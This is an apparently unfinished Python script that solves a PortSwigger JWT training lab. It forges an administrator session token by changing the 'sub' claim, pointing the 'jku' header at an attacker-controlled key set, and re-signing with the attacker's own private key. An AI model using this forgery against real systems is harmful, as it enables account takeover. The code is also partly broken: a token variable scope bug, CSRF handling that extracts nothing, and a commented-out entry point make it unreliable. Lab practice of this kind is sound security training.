"""
Automates PortSwigger JWT Lab 5 (JKU Header Injection).
Steps:
1. Login and extract the session JWT.
2. Decode and modify the payload (sub -> administrator).
3. Inject malicious headers (jku, kid).
4. Sign the new JWT with our private key.

**New Feature**: Fetch CSRF Dynamically 
    1. Parse the response
    2. Extract the CSRF token
    3. Send it to the POST request
"""

import requests
import jwt
import config

PRIVATE_KEY = ""
JWT_TOKEN = ""

def fetch_csrf_dynamically():
    response = requests.get(config.LOGIN_URL)
    if "csrf" in response.text:
        print(response.text)

fetch_csrf_dynamically()

def retrieve_token():
    response = requests.post(config.LOGIN_URL, data=config.Credentials, allow_redirects=False)
    if response.status_code == 302:
        JWT_TOKEN = response.cookies.get("session")
    return JWT_TOKEN

result = retrieve_token()
print(result)

def generate_modified_JWT():

    jwt_token = retrieve_token()
    # 2. Modify payload to impersonate admin
    decoded_payload = jwt.decode(jwt_token, options={"verify_signature":False})
    decoded_payload["sub"] = "administrator"


    decoded_header = jwt.get_unverified_header(jwt_token)

    # 3. Inject JKU and KID into the header
    decoded_header["jku"] = config.JKU_URL
    decoded_header["kid"] = config.KID


    # 4. Load our generated private key
    with open(config.PRIVATE_KEY_PATH, "r") as file:
        PRIVATE_KEY = file.read()

    # 5. Sign the modified JWT
    signed_jwt = jwt.encode(
        decoded_payload,
        PRIVATE_KEY,
        "RS256",
        decoded_header)

    print("Modied JWT:\n ", signed_jwt)       

#def attack_JWT_with_KID():

    

# if __name__=="__main__":
#     generate_modified_JWT()